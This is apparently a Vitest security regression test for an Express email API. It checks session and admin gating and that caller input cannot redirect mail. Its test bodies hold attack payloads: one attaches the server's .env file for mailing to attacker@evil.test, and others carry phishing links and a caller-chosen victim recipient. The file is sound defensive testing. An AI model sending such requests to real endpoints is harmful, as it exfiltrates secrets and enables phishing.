import { describe, it, expect, vi, beforeAll, afterAll, beforeEach } from 'vitest';
import express from 'express';
import type { AddressInfo } from 'node:net';
import type { Server } from 'node:http';

const {
  sendMail,
  sendAlertEmail,
  sendWelcomeEmail,
  sendAnalyticsDigestEmail,
  sendPasswordResetEmail,
  sendTeamInviteEmail,
} = vi.hoisted(() => ({
  sendMail: vi.fn(),
  sendAlertEmail: vi.fn(),
  sendWelcomeEmail: vi.fn(),
  sendAnalyticsDigestEmail: vi.fn(),
  sendPasswordResetEmail: vi.fn(),
  sendTeamInviteEmail: vi.fn(),
}));

vi.mock('../services/email.service', () => ({
  emailService: {
    isConfigured: () => true,
    verifyConnection: async () => ({ success: true }),
    sendMail,
    sendAlertEmail,
    sendWelcomeEmail,
    sendAnalyticsDigestEmail,
    sendPasswordResetEmail,
    sendTeamInviteEmail,
  },
}));

vi.mock('../config/env', () => ({
  env: {
    FRONTEND_URL: 'https://app.example',
    SMTP_HOST: 'smtp.example',
    SMTP_PORT: 587,
    SMTP_SECURE: false,
    SMTP_FROM_NAME: 'Rally',
    SMTP_FROM_EMAIL: 'support@example',
  },
}));

// Authentication is covered in auth.middleware.test.ts. Here the caller's
// identity is whatever the test says it is.
const state = vi.hoisted(() => ({ user: { id: 'user-1', email: 'me@example.com' } as { id: string; email: string } | null }));
vi.mock('../middleware/auth.middleware', () => ({
  requireAuth: (req: any, res: any, next: any) => {
    if (!state.user) return res.status(401).json({ error: 'Unauthorized' });
    req.user = state.user;
    next();
  },
}));

import emailRoutes from './email.routes';

let server: Server;
let base: string;

beforeAll(async () => {
  const app = express();
  app.set('trust proxy', false);
  app.use(express.json());
  app.use('/api/email', emailRoutes);
  await new Promise<void>((resolve) => {
    server = app.listen(0, resolve);
  });
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}/api/email`;
});

afterAll(() => new Promise<void>((resolve) => server.close(() => resolve())));

beforeEach(() => {
  vi.clearAllMocks();
  state.user = { id: 'user-1', email: 'me@example.com' };
  delete process.env.ADMIN_USER_IDS;
  sendAlertEmail.mockResolvedValue({ success: true });
  sendWelcomeEmail.mockResolvedValue({ success: true });
  sendAnalyticsDigestEmail.mockResolvedValue({ success: true });
});

const post = (path: string, body: unknown) =>
  fetch(`${base}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

describe('email routes', () => {
  it('requires a session on every route', async () => {
    state.user = null;
    expect((await fetch(`${base}/status`)).status).toBe(401);
    expect((await post('/verify', {})).status).toBe(401);
    expect((await post('/send', {})).status).toBe(401);
    expect((await post('/send-test', {})).status).toBe(401);
  });

  it('keeps SMTP diagnostics away from ordinary users', async () => {
    expect((await fetch(`${base}/status`)).status).toBe(403);
    expect((await post('/verify', {})).status).toBe(403);
  });

  it('lets a listed admin read diagnostics, and fails closed when none are configured', async () => {
    process.env.ADMIN_USER_IDS = 'someone-else, user-1';
    expect((await fetch(`${base}/status`)).status).toBe(200);
    process.env.ADMIN_USER_IDS = '';
    expect((await fetch(`${base}/status`)).status).toBe(403);
  });

  // The file-exfiltration bug: `attachments: [{ path }]` was forwarded to nodemailer.
  it('has no raw-mail mode, so attachments can never reach nodemailer', async () => {
    const res = await post('/send', {
      to: 'attacker@evil.test',
      subject: 'x',
      html: '<p>x</p>',
      attachments: [{ filename: 'env.txt', path: '/app/server/.env' }],
    });
    expect(res.status).toBe(400);
    expect(sendMail).not.toHaveBeenCalled();
  });

  it('always mails the signed-in user, never a caller-chosen recipient', async () => {
    const res = await post('/send', {
      template: 'alert',
      to: 'victim@evil.test',
      title: 'Hello',
      message: 'Hi',
    });
    expect(res.status).toBe(200);
    expect(sendAlertEmail).toHaveBeenCalledOnce();
    expect(sendAlertEmail.mock.calls[0][0].to).toBe('me@example.com');
  });

  it('ignores caller-supplied links and always uses the app URL', async () => {
    await post('/send', {
      template: 'alert',
      title: 'Hello',
      message: 'Hi',
      actionUrl: 'https://phish.example/login',
    });
    expect(sendAlertEmail.mock.calls[0][0].actionUrl).toBe('https://app.example');
  });

  it('does not expose the password-reset or invite templates', async () => {
    for (const template of ['password-reset', 'invite']) {
      const res = await post('/send', {
        template,
        resetLink: 'https://phish.example',
        inviteUrl: 'https://phish.example',
        inviterName: 'a',
        teamName: 'b',
      });
      expect(res.status).toBe(400);
    }
    expect(sendPasswordResetEmail).not.toHaveBeenCalled();
    expect(sendTeamInviteEmail).not.toHaveBeenCalled();
  });

  it('send-test ignores a body recipient', async () => {
    await post('/send-test', { to: 'victim@evil.test' });
    expect(sendAlertEmail.mock.calls[0][0].to).toBe('me@example.com');
  });
});
